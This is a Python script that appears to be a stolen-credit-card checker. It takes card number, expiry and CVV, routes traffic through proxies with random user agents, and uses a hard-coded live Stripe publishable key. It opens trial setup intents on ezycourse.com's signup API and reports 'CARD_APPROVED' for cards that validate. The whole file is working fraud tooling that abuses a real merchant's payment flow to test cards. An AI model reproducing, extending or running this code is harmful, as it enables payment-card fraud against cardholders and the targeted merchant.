import requests
import random
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

fake = Faker()

def generate_random_email():
    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
    
    f = random.choice(first)
    l = random.choice(last)
    n = random.randint(10, 9999)
    
    patterns = [
        f"{f}.{l}{n}",
        f"{f}{l}{n}",
        f"{f}_{l}{n}",
        f"{f}{n}",
        f"{l}.{f}{n}",
        f"{f}{l}.{n}",
        f"{f}.{l}.{n}",
        f"{f}{random.randint(1980, 2005)}"
    ]
    
    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()

def _run_stripe_auth_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
    u = generate_user_agent()
    
    # 1. Create payment method
    headers1 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': u,
    }
    
    year_str = str(ano)
    if len(year_str) == 4:
        exp_year = year_str[2:]
    else:
        exp_year = year_str

    exp_month = str(mes)
    
    data1 = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&payment_user_agent=stripe.js%2F19f3ad3143%3B+stripe-js-v3%2F19f3ad3143%3B+card-element&key=pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq'
    
    try:
        resp1 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, timeout=15)
        if resp1.status_code != 200:
            err_data = resp1.json()
            err_msg = err_data.get('error', {}).get('message', 'Failed to create payment method')
            return False, err_msg
        
        pm_id = resp1.json().get('id')
        if not pm_id:
            return False, "Failed to get Payment Method ID"
    except Exception as e:
        return False, f"Stripe PM creation error: {str(e)}"
        
    # 2. Create setup intent on ezycourse
    headers2 = {
        'authority': 'ezycourse.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://ezycourse.com',
        'referer': 'https://ezycourse.com/signup?plan=pro&interval=month&trial=true',
        'user-agent': u,
    }
    
    json_data2 = {
        'stripe_payment_method_uuid': pm_id,
        'is_trial': True,
    }
    
    try:
        resp2 = session.post(
            'https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent',
            cookies=session.cookies,
            headers=headers2,
            json=json_data2,
            timeout=15
        )
        if resp2.status_code not in (200, 201):
            return False, f"Setup Intent creation failed: {resp2.text[:100]}"
            
        data_si = resp2.json()
        si_id = data_si.get('id')
        client_secret = data_si.get('client_secret')
        
        if not si_id or not client_secret:
            return False, "Missing setup intent details from ezycourse"
    except Exception as e:
        return False, f"Ezycourse setup intent error: {str(e)}"
        
    # 3. Confirm Setup Intent
    headers3 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': u,
    }
    
    data3 = f'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq&client_secret={client_secret}'
    
    try:
        resp3 = session.post(
            f'https://api.stripe.com/v1/setup_intents/{si_id}/confirm',
            headers=headers3,
            data=data3,
            timeout=20
        )
        resp3_data = resp3.json()
        
        if resp3.status_code == 200:
            status = resp3_data.get('status')
            if status == 'succeeded':
                return True, "CARD_APPROVED"
            elif 'last_setup_error' in resp3_data:
                err_msg = resp3_data['last_setup_error'].get('message', 'Setup failed')
                return False, err_msg
            return False, f"Setup status: {status}"
        else:
            err_msg = resp3_data.get('error', {}).get('message', 'Confirm failed')
            return False, err_msg
    except Exception as e:
        return False, f"Stripe SI confirm error: {str(e)}"

async def process_stripe_auth(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_stripe_auth_sync, cc, mes, ano, cvv, proxy_str)
